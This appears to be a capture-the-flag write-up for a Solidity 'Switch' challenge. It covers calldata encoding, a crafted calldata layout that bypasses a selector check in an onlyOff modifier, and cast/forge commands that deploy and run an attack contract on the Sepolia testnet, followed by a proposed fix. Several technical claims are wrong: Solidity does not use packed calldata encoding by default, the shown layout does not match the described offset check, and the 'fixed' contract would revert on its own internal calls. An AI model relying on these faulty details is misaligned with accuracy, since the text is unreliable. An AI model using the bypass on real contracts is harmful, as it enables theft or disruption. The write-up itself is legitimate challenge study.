# Switch

Just have to flip the switch. Can't be that hard, right?

## CALLDATA

`CALLDATA` is a special area where the input data of a function call is stored. This data includes the function identifier (also known as the function selector) and any parameters passed to the function. The encoding of `CALLDATA` is crucial for the Ethereum Virtual Machine (EVM) to correctly identify and execute the intended function and handle its parameters.

### How CALLDATA is encoded

1. `Function selector`: The first `4 bytes` of `CALLDATA` are reserved for the function selector. This is derived from the first 4 bytes of the Keccak-256 hash of the function signature (e.g., `transfer(address,uint256)`). The function signature includes the function name and the parenthesized list of parameter types. The function selector allows the EVM to determine which function is being called.
2. `Parameters encoding`: After the function selector, the parameters of the function call are encoded. Solidity uses the `Ethereum Contract ABI (Application Binary Interface)` specification for encoding these parameters. The encoding of parameters is done as follows:
   1. `Elementary types`: Elementary types like uint256, address, etc., are encoded as 32 bytes, with more significant bytes added to the left if necessary. For example, an address which is 20 bytes long will have 12 leading zero bytes when encoded.
   2. `Dynamic types`: Types such as bytes and string, whose size can change, are encoded differently. First, the offset to the start of their data is encoded as a 32-byte number, followed by the length of the data (also as a 32-byte number), and then the actual data. The offset is calculated from the start of the function arguments.
   3. `Arrays and Structs`: For arrays and structs, each element or field is encoded sequentially, following the rules for their types. Fixed-size arrays and structs are encoded inline, while dynamic arrays include an offset to the start of their data, similar to dynamic types.
3. `Packed vs. Unpacked`: By default, Solidity uses "packed" encoding for `CALLDATA` to save space and gas. However, when interacting with contracts externally (e.g., via web3.js or ethers.js), the `ABI-encoded` data is typically "unpacked" for readability and standardization purposes.
4. Example: Consider a function call `transfer(address recipient, uint256 amount)`. The `CALLDATA` for this call would start with the function selector for `transfer(address,uint256)`, followed by the 32-byte encoded `address` of the recipient (with leading zeros), and then the 32-byte encoded `amount`.

### calldatacopy

The `calldatacopy` instruction in Solidity's inline assembly is used to copy data from the call data to memory. The calldatacopy instruction is particularly useful for operations that require direct manipulation or inspection of the raw call data, which can be more gas-efficient in certain scenarios. Here's a breakdown of how calldatacopy works:

It's often used in low-level operations, such as when a contract needs to dynamically determine which function to call or when processing arbitrary-length data that doesn't fit neatly into Solidity's type system.

`calldatacopy` is a powerful tool for low-level manipulation of call data in Solidity contracts, enabling efficient data handling and custom processing scenarios. However, its use requires careful consideration of safety, complexity, and compatibility aspects.

- Syntax: calldatacopy(t, f, s)

    t (target): The starting position in memory where the data should be copied to.
    f (from): The starting position in the call data from where to begin copying.
    s (size): The number of bytes to copy from the call data to memory.

```bash
assembly {
    calldatacopy(selector, 68, 4) // grab function selector from calldata
}
```

This line copies 4 bytes (the size of a function selector) from the call data starting at position 68 into the `selector` variable in memory. The choice of position 68 assumes a specific layout of the call data, likely based on the structure of the transaction being sent to `flipSwitch`.

## Vulnerability

```bash
✗ cast sig "flipSwitch(bytes)"
0x30c13ade

cast sig "turnSwitchOff()"
0x20606e15

✗ cast sig "turnSwitchOn()"
0x76227e12
```

To set up the calldata for calling `flipSwitch(bytes memory _data)` in a way that passes the `onlyOff` modifier's check, you need to construct the calldata so that it includes the function selector for `flipSwitch(bytes memory _data)` followed by the necessary padding and the embedded call to `turnSwitchOff()`, which has the selector 0x20606e15. The `onlyOff` modifier checks for this selector at an offset of 64 bytes into the calldata.

1. Start with the function selector for `flipSwitch(bytes memory _data)`: 0x30c13ade.
2. `Add padding to reach the offset for the embedded function call`: Since Solidity uses `32-byte (256-bit) slots` and the function selector is at the beginning, followed by the length of the bytes array (also `32 bytes`), the next part of the calldata (the actual bytes array content) starts at byte 64. This is where the embedded function selector needs to be placed.
3. Include the function selector for `turnSwitchOff(): 0x20606e15`. This is the value that the `onlyOff` modifier checks for at the 64-byte offset.

```bash
# Calldata layout (32-byte slots)
# 0x30c13ade                                                       -> function selector for flipSwitch(bytes memory data)
# 0000000000000000000000000000000000000000000000000000000000000004 -> length of the bytes array (in bytes)
# 0000000000000000000000000000000000000000000000000000000000000000 -> padding to reach the 64-byte offset
# 20606e15                                                         -> function selector for turnSwitchOff()
```

## Attack

1. Deploy `SwitchAttack`.

```bash
forge script script/DeploySwitchAttack.s.sol --rpc-url $ALCHEMY_RPC_URL --private-key $PRIVATE_KEY --broadcast --verify --etherscan-api-key $ETHERSCAN_API_KEY -vvvv --legacy

# make deploy ARGS="--network sepolia"
# https://sepolia.etherscan.io/address/0x70aD9fB0D0e2d9C82Bcf4DB46E6BdD2Beb5c7157
```

3. Attack

```bash
cast send $CONTRACT_ADDRESS "attack()" --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL --legacy

# https://sepolia.etherscan.io/tx/0xf1235f7755a33fcde34225c518755fe83d873519f671f43e6a95bb9a2e521744
```

## Fix

1. `Use explicit function calls instead of dynamic calls`: Replace the dynamic call in `flipSwitch` with explicit function calls. This prevents an attacker from crafting calldata that bypasses the contract's intended logic.

2. `Strengthen the onlyOff modifier`: Ensure that the `onlyOff` modifier checks not just for the presence of a specific function selector but also validates the overall structure and intent of the call.

3. `Validate the entire calldata`: Instead of just checking a portion of the calldata, validate the entire calldata to ensure it matches expected patterns for legitimate use cases.

4. `Use a more secure way to manage contract state`: Instead of allowing any external call to change the state, restrict state changes to predefined functions that are protected by appropriate access control mechanisms.

```bash
contract Switch {
    bool public switchOn; // switch is off
    bytes4 private constant OFF_SELECTOR = bytes4(keccak256("turnSwitchOff()"));
    bytes4 private constant ON_SELECTOR = bytes4(keccak256("turnSwitchOn()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    # This modifier is no longer needed if we're not using dynamic calls
    # modifier onlyOff() {
    #     require(!switchOn, "Switch must be off");
    #     _;
    # }

    function flipSwitch(bool turnOn) public {
        require(!switchOn, "Switch must be off");
        if (turnOn) {
            turnSwitchOn();
        } else {
            turnSwitchOff();
        }
    }

    function turnSwitchOn() private onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() private onlyThis {
        switchOn = false;
    }
}
```
